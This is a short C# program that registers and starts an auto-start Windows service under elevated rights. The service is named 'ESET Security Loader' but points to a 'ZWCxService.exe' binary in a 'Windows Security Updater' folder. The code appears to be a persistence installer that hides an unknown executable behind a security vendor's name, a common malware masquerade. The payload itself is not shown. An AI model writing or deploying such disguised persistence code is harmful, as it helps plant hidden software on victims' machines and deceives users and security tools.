using System;
using System.ServiceProcess;
using System.Diagnostics;

namespace MyApplicationNamespace
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check if the service is already installed
            ServiceController[] services = ServiceController.GetServices();
            bool serviceExists = false;
            foreach (ServiceController service in services)
            {
                if (service.ServiceName == "ESET Security Loader")
                {
                    serviceExists = true;
                    break;
                }
            }

            // If the service is not installed, create it
            if (!serviceExists)
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                path += "\\Windows Security Updater\\ZWCxService.exe";
                ProcessStartInfo processInfo = new ProcessStartInfo();
                processInfo.FileName = "sc";
                processInfo.Arguments = "create \"ESET Security Loader\" binPath= \"" + path + "\" start= auto"; // Start the service automatically
                processInfo.Verb = "runas"; // Run as administrator

                ProcessStartInfo processInfoStart = new ProcessStartInfo();
                processInfoStart.FileName = "sc";
                processInfoStart.Arguments = "start \"ESET Security Loader\""; // Start the service
                processInfoStart.Verb = "runas"; // Run as administrator
                try
                {
                    Process.Start(processInfo);
                    Process.Start(processInfoStart);
                    Console.WriteLine("Service created successfully.");
                    Console.ReadKey();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred while creating the service: {ex.Message}");
                }
            }
        }
    }
}
